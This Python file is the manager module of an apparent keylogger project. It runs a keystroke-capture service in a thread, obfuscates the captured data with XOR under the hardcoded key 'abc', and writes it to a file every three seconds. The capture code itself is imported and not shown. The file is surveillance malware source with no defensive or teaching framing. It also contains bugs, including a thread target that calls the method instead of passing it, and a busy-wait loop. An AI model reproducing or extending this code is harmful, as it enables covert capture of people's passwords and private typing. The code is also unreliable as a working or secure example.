from  KeyloggerService import *
from FileWriter import *
import threading
import time
from  IEncryptor import *

from modules.Encryptor import XOREncryptor


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()
        self.encryptor :  IEncryptor = XOREncryptor()
        self.writer  = FileWriter()

    def start(self):
        self.instance.start()
        while self.instance.return_action():
            True
        return

    def write_to_file(self):
        while self.instance.return_action():

            self.writer.write(self.xor_encryption())
            print("write_to_file")
            time.sleep(3)


    def xor_encryption(self):
        return self.encryptor.encryption(self.instance.get_data(),"abc")

    def xor_decryption(self):
        pass


    def main(self):
        threading.Thread(target=self.start).start()
        time.sleep(0.1)
        threading.Thread(target=self.write_to_file()).start()
        time.sleep(0.1)




A = KeyLoggerManager()
A.main()
